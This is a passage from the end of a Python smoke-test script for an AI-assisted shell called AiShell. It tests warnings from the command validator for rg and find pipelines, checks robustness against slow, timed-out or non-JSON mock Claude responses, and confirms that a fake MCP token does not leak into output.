    # MCP044: validate_command(rg -n "TODO" src) → warn/blocked, suggestion mentions find
    # ------------------------------------------------------------------
    s44, b44 = _post(port2, _vc_body('rg -n "TODO" src', req_id=44))
    try:
        r44      = _vc_result(b44)
        level44  = r44.get("level", "")
        sugg44   = r44.get("suggestion", "")
        mc44_ok  = (s44 == 200
                    and level44 in ("warn", "blocked")
                    and "find" in sugg44)
    except Exception as exc44:
        mc44_ok = False
        b44 = str(exc44)
    _record("MCP044",
            'validate_command(rg -n "TODO" src) → warn/blocked, suggestion mentions find',
            mc44_ok,
            f"level={r44.get('level','')} sugg={r44.get('suggestion','')[:80]}"
            if not mc44_ok else "")

    # ------------------------------------------------------------------
    # MCP045: validate_command(find ... -exec wc -c {} + | sort -rn | head)
    #         → warn, suggestion mentions xargs -n 1 or total
    # ------------------------------------------------------------------
    _bad_wc_cmd = ('find src -type f -name "*.c" -exec wc -c {} + '
                   '| sort -rn | head -n 10')
    s45, b45 = _post(port2, _vc_body(_bad_wc_cmd, req_id=45))
    r45 = {}
    try:
        r45      = _vc_result(b45)
        level45  = r45.get("level", "")
        sugg45   = r45.get("suggestion", "")
        mc45_ok  = (s45 == 200
                    and level45 in ("warn", "blocked")
                    and ("xargs" in sugg45 or "total" in sugg45))
    except Exception as exc45:
        mc45_ok = False
        b45 = str(exc45)
    _record("MCP045",
            'validate_command(find ... -exec wc -c {} + | sort -rn | head) → warn + xargs suggestion',
            mc45_ok,
            f"level={r45.get('level','')} sugg={r45.get('suggestion','')[:80]}"
            if not mc45_ok else "")

    # ------------------------------------------------------------------
    # MCP046: validate_command(find ... -exec rg ...) → blocked, suggestion
    #         mentions grep -R
    # ------------------------------------------------------------------
    _exec_rg_cmd = ('find src/ai -type f -name "*.c" '
                    '-exec rg -n "validate_command" {} +')
    s46, b46 = _post(port2, _vc_body(_exec_rg_cmd, req_id=46))
    r46 = {}
    try:
        r46      = _vc_result(b46)
        level46  = r46.get("level", "")
        sugg46   = r46.get("suggestion", "")
        mc46_ok  = (s46 == 200
                    and level46 in ("warn", "blocked")
                    and ("grep" in sugg46 or "rg" in sugg46))
    except Exception as exc46:
        mc46_ok = False
        b46 = str(exc46)
    _record("MCP046",
            'validate_command(find ... -exec rg ...) → warn/blocked + grep/rg suggestion',
            mc46_ok,
            f"level={r46.get('level','')} sugg={r46.get('suggestion','')[:80]}"
            if not mc46_ok else "")

    _mcp_stop(proc2)


# ---------------------------------------------------------------------------
# Section RB — Robustness (Phase 11: timeout / non-JSON / heartbeat)
# ---------------------------------------------------------------------------

def section_robustness():
    print("\n--- Section RB: Robustness ---")

    def rb_env(**extra):
        """Safe base env for robustness tests: strip AISHELL_*, add extras."""
        e = {k: v for k, v in os.environ.items() if not k.startswith("AISHELL_")}
        e.update(extra)
        return e

    slow_mock     = os.path.join(ROOT, "tests", "mock_claude_slow.sh")
    non_json_mock = os.path.join(ROOT, "tests", "mock_claude_non_json.sh")

    # ------------------------------------------------------------------
    # RB001: Heartbeat fires when Claude is slow
    # mock_claude_slow.sh sleeps 3 s; heartbeat interval set to 1 s so at
    # least one "still waiting" line must appear.
    # ------------------------------------------------------------------
    env_hb = rb_env(
        AISHELL_AI_BACKEND              = "claude",
        AISHELL_MCP_ENABLED             = "0",
        AISHELL_CLAUDE_PATH             = slow_mock,
        AISHELL_AI_TIMEOUT_MS           = "10000",
        AISHELL_AI_MAX_RETRIES          = "0",
        AISHELL_AI_RETRY_BACKOFF_MS     = "50",
        AISHELL_DEBUG_HEARTBEAT_MS      = "1000",
    )
    r_hb = run_interactive("@ show working directory\n\n", env=env_hb, timeout=15)
    ok_hb = not r_hb.timed_out and "still waiting" in r_hb.stderr
    _record("RB001", "heartbeat fires during slow Claude invocation",
            ok_hb,
            "" if ok_hb else
            f"timed_out={r_hb.timed_out} stderr={r_hb.stderr[:200]!r}")

    # ------------------------------------------------------------------
    # RB002: Non-JSON output starting with 'M' → "non-JSON output" error,
    # not a raw parse_error
    # ------------------------------------------------------------------
    env_nj = rb_env(
        AISHELL_AI_BACKEND          = "claude",
        AISHELL_MCP_ENABLED         = "0",
        AISHELL_CLAUDE_PATH         = non_json_mock,
        AISHELL_AI_TIMEOUT_MS       = "5000",
        AISHELL_AI_MAX_RETRIES      = "0",
        AISHELL_AI_RETRY_BACKOFF_MS = "50",
    )
    r_nj = run_interactive("@ do something\n", env=env_nj)
    ok_nj_error   = "non-JSON output" in r_nj.stderr
    ok_nj_noparse = "parse_error" not in r_nj.stderr
    _record("RB002", "non-JSON output (starts with M) → 'non-JSON output' error",
            ok_nj_error,
            f"stderr={r_nj.stderr[:200]!r}" if not ok_nj_error else "")
    _record("RB003", "non-JSON output does not produce 'parse_error' message",
            ok_nj_noparse,
            f"stderr={r_nj.stderr[:200]!r}" if not ok_nj_noparse else "")

    # ------------------------------------------------------------------
    # RB004: Non-JSON output starting with 'E' is also classified correctly.
    # Use AISHELL_MOCK_AI_JSON to inject a non-JSON value through the mock
    # backend (which also runs through the non-JSON check in at_command_handle).
    # ------------------------------------------------------------------
    env_nj_e = rb_env(
        AISHELL_AI_BACKEND      = "mock",
        AISHELL_MCP_ENABLED     = "0",
        AISHELL_MOCK_AI_JSON    = "Error: rate limit exceeded; please retry later",
    )
    r_nj_e = run_interactive("@ do something\n", env=env_nj_e)
    ok_nj_e = "non-JSON output" in r_nj_e.stderr
    _record("RB004", "non-JSON output starting with 'E' → 'non-JSON output' error",
            ok_nj_e,
            f"stderr={r_nj_e.stderr[:200]!r}" if not ok_nj_e else "")

    # ------------------------------------------------------------------
    # RB005: Sanitized preview is capped at 120 characters.
    # Feed a 200-char non-JSON string and verify the preview line is short.
    # ------------------------------------------------------------------
    long_garbage = "X" * 200
    env_nj_long = rb_env(
        AISHELL_AI_BACKEND   = "mock",
        AISHELL_MCP_ENABLED  = "0",
        AISHELL_MOCK_AI_JSON = long_garbage,
    )
    r_nj_long = run_interactive("@ do something\n", env=env_nj_long)
    # Extract the "@ preview: ..." line from stderr
    preview_line = ""
    for line in r_nj_long.stderr.splitlines():
        if line.startswith("@ preview:"):
            preview_line = line
            break
    # The preview text after "@ preview: " should be at most 120 chars
    preview_text = preview_line[len("@ preview: "):] if preview_line else ""
    ok_trunc = len(preview_text) <= 120
    _record("RB005", "non-JSON preview truncated to ≤ 120 characters",
            ok_trunc,
            f"len={len(preview_text)} preview={preview_line!r}" if not ok_trunc else "")

    # ------------------------------------------------------------------
    # RB006: Valid raw JSON still works (non-JSON check does not interfere).
    # ------------------------------------------------------------------
    env_ok = rb_env(
        AISHELL_AI_BACKEND  = "mock",
        AISHELL_MCP_ENABLED = "0",
    )
    r_ok = run_interactive("@ show working directory\n\n", env=env_ok)
    ok_valid = "Going to execute:" in r_ok.stdout and "non-JSON" not in r_ok.stderr
    _record("RB006", "valid raw JSON still processed correctly",
            ok_valid,
            f"stdout={r_ok.stdout[:200]!r} stderr={r_ok.stderr[:100]!r}"
            if not ok_valid else "")

    # ------------------------------------------------------------------
    # RB007: Valid fenced JSON still works (strip_code_fence + non-JSON check).
    # ------------------------------------------------------------------
    fenced = ('```json\n'
              '{"command":"pwd","explanation":"cwd","risk":"read_only","confidence":1.0}\n'
              '```')
    env_fenced = rb_env(
        AISHELL_AI_BACKEND   = "mock",
        AISHELL_MCP_ENABLED  = "0",
        AISHELL_MOCK_AI_JSON = fenced,
    )
    r_fenced = run_interactive("@ show working directory\n\n", env=env_fenced)
    ok_fenced = "Going to execute:" in r_fenced.stdout and "non-JSON" not in r_fenced.stderr
    _record("RB007", "valid fenced JSON still processed correctly",
            ok_fenced,
            f"stdout={r_fenced.stdout[:200]!r} stderr={r_fenced.stderr[:100]!r}"
            if not ok_fenced else "")

    # ------------------------------------------------------------------
    # RB008: Token does not appear in stdout or stderr during a slow run.
    # (Re-uses the env_hb run from RB001 since that is the richest stderr.)
    # ------------------------------------------------------------------
    # The MCP token is not set in env_hb (MCP is disabled), so we use a
    # synthetic token and verify it doesn't appear if MCP were enabled.
    # Instead, check that "non-JSON" and other diagnostic messages never
    # accidentally dump credential-like strings.  For a simpler invariant:
    # the MCP token env var is not set here, so we confirm it is absent.
    fake_token = "test-rb008-secret-token-xyz"
    env_tok = rb_env(
        AISHELL_AI_BACKEND          = "claude",
        AISHELL_MCP_ENABLED         = "0",
        AISHELL_CLAUDE_PATH         = slow_mock,
        AISHELL_AI_TIMEOUT_MS       = "10000",
        AISHELL_AI_MAX_RETRIES      = "0",
        AISHELL_AI_RETRY_BACKOFF_MS = "50",
        AISHELL_DEBUG_HEARTBEAT_MS  = "1000",
        AISHELL_MCP_TOKEN           = fake_token,
    )
    r_tok = run_interactive("@ show working directory\n\n", env=env_tok, timeout=15)
    ok_tok = (fake_token not in r_tok.stdout and fake_token not in r_tok.stderr)
    _record("RB008", "MCP token does not appear in stdout or stderr",
            ok_tok,
            "token found in output!" if not ok_tok else "")

    # ------------------------------------------------------------------
    # RB009: Timeout path does not attempt to parse partial stdout.
    # Use mock_claude_sleep.sh (sleeps 60 s) with a 300 ms timeout.
    # Verify no "Going to execute:" and no parse_error in output.
    # ------------------------------------------------------------------
    env_to = rb_env(
        AISHELL_AI_BACKEND          = "claude",
        AISHELL_MCP_ENABLED         = "0",
        AISHELL_CLAUDE_PATH         = os.path.join(ROOT, "tests", "mock_claude_sleep.sh"),
        AISHELL_AI_TIMEOUT_MS       = "300",
        AISHELL_AI_MAX_RETRIES      = "0",
        AISHELL_AI_RETRY_BACKOFF_MS = "50",
    )
    r_to = run_interactive("@ do something\n", env=env_to)
    ok_to_noexec   = "Going to execute:" not in r_to.stdout
    ok_to_noparse  = "parse_error" not in r_to.stderr
    ok_to_error    = "@ error:" in r_to.stderr
    _record("RB009a", "timeout: no 'Going to execute:' in stdout",
            ok_to_noexec,
            f"stdout={r_to.stdout[:200]!r}" if not ok_to_noexec else "")
    _record("RB009b", "timeout: no 'parse_error' in stderr",
            ok_to_noparse,
            f"stderr={r_to.stderr[:200]!r}" if not ok_to_noparse else "")
    _record("RB009c", "timeout: '@ error:' present in stderr",
            ok_to_error,
            f"stderr={r_to.stderr[:200]!r}" if not ok_to_error else "")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    print(f"AiShell smoke test  (root: {ROOT})")
    print(f"Timeout per invocation: {TIMEOUT}s  |  Verbose: {VERBOSE}")

    build_ok = section_build()
    if not build_ok:
        print("\nBuild failed — aborting remaining tests.")
        print("\n=== 0 passed, 1 failed ===")
        sys.exit(1)

    commands = discover_commands()
    section_help(commands)
    section_functional()
    section_multicall()
    section_docs()
    section_json_parse()
    section_config()
    section_claude_client()
    section_validate()
    section_at()
    section_robustness()
    section_mcp()

    passed = sum(1 for *_, p, _ in _results if p)
    failed = len(_results) - passed

    if failed:
        print(f"\n--- Failed tests ---")
        for tid, desc, ok, detail in _results:
            if not ok:
                print(f"[FAIL] {tid:<38}  {desc}")
                if detail:
                    for line in detail.splitlines():
                        print(f"       {line}")

    print(f"\n=== {passed} passed, {failed} failed ===")
    sys.exit(0 if failed == 0 else 1)


if __name__ == "__main__":
    main()
